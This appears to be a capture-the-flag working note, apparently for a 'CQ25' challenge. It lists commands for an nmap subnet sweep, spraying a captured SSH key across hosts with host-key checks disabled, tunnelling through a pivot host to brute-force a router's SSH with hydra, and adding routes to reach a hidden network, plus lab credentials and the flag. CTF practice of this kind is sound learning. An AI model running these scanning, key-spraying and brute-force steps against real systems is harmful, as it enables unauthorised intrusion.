# Heading level 1

TODO: writeup comes here

# ssh
```bash
sshpass -p DioNer ssh kay@10.214.1.11 -p 2200
```

# Pcap
ssh key fragments
smtp, imap, pop

ssh conn fragments 10.201.0.2:22 
SSH-USERAUTH(root:***)

HTTP Post username=user&password=pass

TO:<admin@cq2025.com>

# Nmap
```bash
for s in {200..254}; do echo "Scanning 10.$s.0.0/24"; ./nmap -T5 -p22 10.$s.0.0/24; done
```


# SSH
```bash
USER=root; while IFS= read -r host; do \
  ssh -i ./key -o BatchMode=yes -o PasswordAuthentication=no -o PreferredAuthentications=publickey \
      -o ConnectTimeout=1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      "$USER@$host" 'echo AUTH_OK' >/dev/null 2>&1 && echo "$host" >> key_success.txt && echo "$host: OK" || echo "$host: FAIL"; \
done < hosts.txt
```


router.net1 (10.200.0.254) has pw auth

Hydra


```bash
sshpass -p DioNer ssh kay@10.214.1.11 -p 2200 -L 22222:10.200.0.254:22
hydra -f -t 8 -s 22222 -L usernames.txt -P /opt/wordlists/seclists/Passwords/xato-net-10-million-passwords-100.txt ssh://localhost
```

# Interfaces

```bash
ip a
nmap -T4 10.201.0.2
ip route
ip route get 10.201.0.2
```

```bash
ip route add 10.201.0.0/24 dev eth1
nmap -T4 10.201.0.2
```

# Flag
`CQ25{r0uT3_f1X3d_53cr37_f0uNd}`